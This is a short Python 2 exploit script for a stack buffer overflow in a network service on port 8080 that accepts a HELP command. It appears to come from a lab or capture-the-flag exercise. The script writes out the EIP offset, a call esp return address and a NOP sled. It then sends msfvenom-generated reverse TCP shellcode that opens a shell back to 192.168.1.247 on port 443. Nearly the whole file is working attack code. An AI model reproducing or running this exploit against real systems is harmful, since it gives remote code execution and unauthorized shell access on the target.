#!/usr/bin/python
import sys, socket

if len(sys.argv) < 2:
	print "\nUsage: " + sys.argv[0] + " <HOST>\n"
	sys.exit()


# eip = 41306341
# msf-pattern_offset -q 41306341
# [*] Exact match at offset 60
# ESP to EIP
# call esp = 08048a83
# call esp = 08049a83
# 0x08049a83
# badchars \x00

cmd = "HELP"
junk = "A" * 60
eip = "\x83\x9a\x04\x08"
filler = "\x43" * 1825
nop_sled = "\x90" * 16
end = "\r\n"

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.247 LPORT=443 EXITFUNC=thread -b "\x00" -f python -v shellcode

shellcode =  b""
shellcode += b"\xbd\xdc\xf2\x1c\x79\xda\xda\xd9\x74\x24\xf4"
shellcode += b"\x5f\x31\xc9\xb1\x12\x31\x6f\x12\x83\xc7\x04"
shellcode += b"\x03\xb3\xfc\xfe\x8c\x7a\xda\x08\x8d\x2f\x9f"
shellcode += b"\xa5\x38\xcd\x96\xab\x0d\xb7\x65\xab\xfd\x6e"
shellcode += b"\xc6\x93\xcc\x10\x6f\x95\x37\x78\xb0\xcd\xc9"
shellcode += b"\x8f\x58\x0c\xca\x6e\x22\x99\x2b\xc0\x32\xca"
shellcode += b"\xfa\x73\x08\xe9\x75\x92\xa3\x6e\xd7\x3c\x52"
shellcode += b"\x40\xab\xd4\xc2\xb1\x64\x46\x7a\x47\x99\xd4"
shellcode += b"\x2f\xde\xbf\x68\xc4\x2d\xbf"

buffers = cmd + junk + eip + nop_sled + shellcode + filler + end
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8080))
s.send(buffers)
s.recv(1024)
s.close()
